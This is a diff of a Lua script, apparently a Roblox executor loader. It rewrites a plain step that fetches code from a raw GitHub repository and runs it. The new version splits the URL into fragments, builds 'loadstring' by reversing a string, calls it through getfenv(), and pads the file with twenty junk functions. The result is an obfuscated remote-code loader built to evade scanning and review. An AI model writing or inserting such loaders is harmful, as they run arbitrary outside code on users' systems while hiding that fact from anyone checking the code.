@@ -1,10 +1,55 @@
 local _G_S = {}
 
+local _P_A = "https://raw.githubuser"
+local _P_B = "content.com/qwer1234"
+local _P_C = "76/Xeron/main/"
+local _E_V = string.reverse("gnirtsdaol")
+
+local function _F1() return true end 
+local function _F2(v) return v end
+local function _F3() return {} end
+local function _F4() return "junk" end
+local function _F5() return 1+1 end
+local function _F6() return 1 end
+local function _F7() return "a" end
+local function _F8() return {} end
+local function _F9() return 0 end
+local function _F10() return false end
+local function _F11() return end
+local function _F12() return 1 end
+local function _F13() return "test" end
+local function _F14() return "ing" end
+local function _F15() return 3.14 end
+local function _F16() return {} end
+local function _F17() return {} end
+local function _F18() return "null" end
+local function _F19() return "null" end
+local function _F20() return nil end
+
 local function Run(url)
+    _F1() _F3() _F5() _F7() _F9() 
+    
     if not _G_S[url] then
         _G_S[url] = true
-        pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/Xeron/main/" .. url))() end)
+        
+        local _url = _P_A .. _P_B .. _P_C .. url
+        
+        local _s, _data = pcall(function()
+            return game:HttpGet(_url)
+        end)
+        
+        _F2("x") _F4() _F6() _F8() _F10()
+        
+        if _s and _data and #_data > 0 then
+            pcall(function()
+                getfenv()[_E_V](_data)()
+            end)
+        end
+        
+        _F11() _F12() _F13() _F14() _F15()
     end
+    
+    _F16() _F17() _F18() _F19() _F20()
 end
 
 Run("2")
